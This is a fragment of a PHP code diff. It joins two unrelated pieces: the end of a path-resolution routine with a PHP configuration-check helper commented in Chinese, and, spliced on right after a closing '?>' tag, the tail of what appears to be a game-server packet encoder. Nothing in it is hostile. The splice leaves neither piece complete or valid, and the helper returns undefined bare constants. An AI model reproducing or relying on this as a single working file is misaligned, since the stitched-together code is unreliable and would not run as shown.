+		$relativepath_info       = explode('/', $relativepath);
+		$relativepath_info_count = count($relativepath_info);
+		for ($i=0; $i<$relativepath_info_count; $i++) {
+			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
+			if ($relativepath_info[$i] == '..') {
+				$mainpath_info_count = count($mainpath_info);
+				unset($mainpath_info[$mainpath_info_count-1]);
+				continue;
+			}
+			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
+		} //end for
+		return implode('/', $mainpath_info);
+	}
+
+	// 检查PHP配置参数
+	function getphpcfg($varname) {
+		switch($result = get_cfg_var($varname)) {
+			case 0:
+			return No;
+			break;
+			case 1:
+			return Yes;
+			break;
+			default:
+			return $result;
+			break;
+		}
+	}
+?>		foreach($this->attributes as $attribute){
+			$this->putString($attribute->getName());
+			$this->putLFloat($attribute->getMinValue());
+			$this->putLFloat($attribute->getValue());
+			$this->putLFloat($attribute->getMaxValue());
+		}
+
+		$this->putEntityMetadata($this->metadata);
+		$this->putUnsignedVarInt(count($this->links));
+		foreach($this->links as $link){
+			$this->putEntityLink($link);
+		}
+	}
+
+	public function handle(NetworkSession $session) : bool{
+		return $session->handleAddActor($this);
+	}
+}
